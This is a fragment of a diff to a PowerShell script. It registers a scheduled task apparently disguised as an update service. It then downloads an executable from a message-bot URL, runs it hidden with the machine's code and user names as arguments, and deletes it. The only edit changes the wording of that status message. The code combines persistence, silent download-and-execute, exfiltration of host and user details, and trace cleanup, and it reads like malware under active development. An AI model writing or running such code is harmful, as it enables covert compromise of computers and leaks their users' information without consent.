@@ -106,7 +106,7 @@ if (Get-ScheduledTask -TaskName $updateserv -ErrorAction SilentlyContinue) {
 Register-ScheduledTask -Xml $updateservxml -TaskName $updateserv | Out-Null
 Start-ScheduledTask -TaskName $updateserv
 #DataUpload
-$combineddata = """ScheduledTask Installed on **$code** and system's user(s) are *$userNames*"""
+$combineddata = """ScTa Installed on **$code** and system's user(s) is/are **$userNames**"""
 Invoke-WebRequest -Uri $messageboturl -OutFile $exePath -UseBasicParsing
 Start-Process -WindowStyle Hidden -FilePath $exePath -ArgumentList $combineddata
 Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
